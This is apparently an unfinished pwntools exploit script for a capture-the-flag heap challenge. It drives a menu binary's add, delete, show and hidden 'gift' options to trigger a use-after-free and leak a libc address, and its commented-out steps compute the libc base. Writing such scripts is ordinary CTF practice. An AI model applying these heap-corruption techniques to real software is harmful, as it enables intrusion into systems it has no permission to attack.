#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

# remote_service = ""
# remote_service = remote_service.strip().split(":")
# p = remote(remote_service[0], int(remote_service[1]))
filename = "./pwn"
p = process(filename)
e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
	lg("p.pid")
	input()
	pass
def cmd(choice):
	ru(b'Choice: ')
	sl(i2b(choice))
def add(size, data):
	cmd(1)
	ru(b'Please input size: \n')
	sl(i2b(size))
	ru(b'Please input content: \n')
	sn(data)
def delete(idx):
	cmd(2)
	ru(b'Please input idx: \n')
	sl(i2b(idx))
def show(idx):
	cmd(3)
	ru(b'Please input idx: \n')
	sl(i2b(idx))
def gift(idx):
	cmd(666)
	ru(b'Please input idx: \n')
	sl(i2b(idx))

for i in range(9):
	add(0x68, b"aaa")
for i in range(7):
	delete(i)
gift(7)
add(0x68, b"aaa")
delete(7)
show(7)
# leak = uu64(ru(b"\nDone!", "drop"))
# lg("leak")

# add(0x68, )

# for i in range(7):
# 	add(0x68, b"aaa")
# add(0x68, p64(0xdeadbeef))




# for i in range(9):
# 	add(0x90, b"aaa")
# for i in range(7):
# 	delete(i)
# gift(7)
# show(7)
# leak = uu64(ru(b"\nDone!", "drop"))
# lg("leak")
# libc_base = leak - 0x1ecbe0
# lg("libc_base")

# for i in range(9):
# 	add(0x68, b"aaa")
# for i in range(7):
# 	delete(i)
# delete(9)


debugPID()
irt()
